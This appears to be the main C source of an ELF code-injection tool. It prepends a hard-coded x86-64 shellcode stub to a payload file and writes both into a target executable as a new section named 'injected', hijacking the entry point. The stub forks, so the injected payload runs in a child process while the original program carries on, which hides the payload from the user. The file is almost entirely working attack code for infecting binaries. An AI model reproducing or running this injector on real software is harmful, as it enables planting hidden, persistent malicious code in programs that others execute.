#include "elf_inject.h"

int main(int argc, char *argv[])
{
    FILE *inject_f;
    int elf_fd, ret;
    size_t offset_addr, offset_ep_set;
    size_t len, secaddr;
    char *elf_fname, *inject_fname, *secname, *code;
    inject_data_t inject;

    char base[] = "\x51\x52\x56\x57\x41\x53\xb8\x39\x00\x00\x00\x0f\x05\x83"
                  "\xf8\x00\x74\x14\xe8\x00\x00\x00\x00\x58\x48\x2d\x87\xa3"
                  "\x7f\x00\x41\x5b\x5f\x5e\x5a\x59\x50\xc3";

    if (argc != 3) {
        printf("Usage: %s <elf> <inject>\n\n", argv[0]);
        return 1;
    }

    elf_fname = argv[1];
    inject_fname = argv[2];

    offset_addr = 23;
    offset_ep_set = 26; 
    secname = "injected";
    secaddr = 8388608;

    inject_f = fopen(inject_fname, "r");
    if (!inject_f) {
        return 1;
    }

    fseek(inject_f, 0, SEEK_END);
    len = ftell(inject_f) + BASE_LEN;
    fseek(inject_f, 0, SEEK_SET);


    code = malloc(len);
    if (!code) {
        fclose(inject_f);
        return 1;
    }
    
    memcpy(code, base, BASE_LEN);

    if (fread(code + BASE_LEN, 1, len, inject_f) != len - BASE_LEN) {
        return 1;
    }
    fclose(inject_f);

    elf_fd = open(elf_fname, O_RDWR);
    if (elf_fd < 0) {
        free(code);
        return 1;
    }


    inject.code = code;
    inject.len = len;
    inject.secname = secname;
    inject.secaddr = secaddr;
    inject.offset_addr = offset_addr;
    inject.offset_ep_set = offset_ep_set;

    ret = 0;
    ret = inject_code(elf_fd, &inject);

    free(code);
    close(elf_fd);

    return ret;
}
